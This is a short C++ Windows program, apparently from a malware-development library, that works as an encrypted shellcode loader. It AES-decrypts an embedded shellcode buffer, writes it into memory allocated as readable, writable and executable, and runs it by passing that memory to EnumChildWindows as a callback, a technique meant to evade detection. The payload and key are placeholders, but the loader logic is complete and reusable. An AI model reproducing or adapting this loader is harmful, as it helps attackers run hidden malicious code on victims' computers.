#include<windows.h>
#include<stdio.h>
#include"MalDev-Lib/lib-Shellcode/Shellcode.h"

int main(){
    unsigned char shellcode[] = " ";

    unsigned char key[] = "123456789";
    unsigned char iv[] = "123456789";

    int payloadLen = sizeof(shellcode); // Calculate the length of the shellcode array

    // Create an instance of the Shellcode class with the given shellcode and its length
    Shellcode sc(shellcode,payloadLen);
    
    // Decrypt the shellcode using AES encryption with the specified key and IV
    unsigned char *decrypted = sc.AES_decrypt(key,iv);
    
    // Allocate memory for the decrypted shellcode with executable permissions
    HANDLE hAlloc = VirtualAlloc(NULL,payloadLen,MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE);
    
     // Copy the decrypted shellcode to the allocated memory
    memcpy(hAlloc,decrypted,payloadLen);
    
    // Enumerate through child windows and execute the shellcode
    EnumChildWindows((HWND)NULL,(WNDENUMPROC)hAlloc,(LPARAM)NULL);

    // Note: The shellcode execution depends on the actual shellcode being valid and the decryption process being successful.

    return 0;
}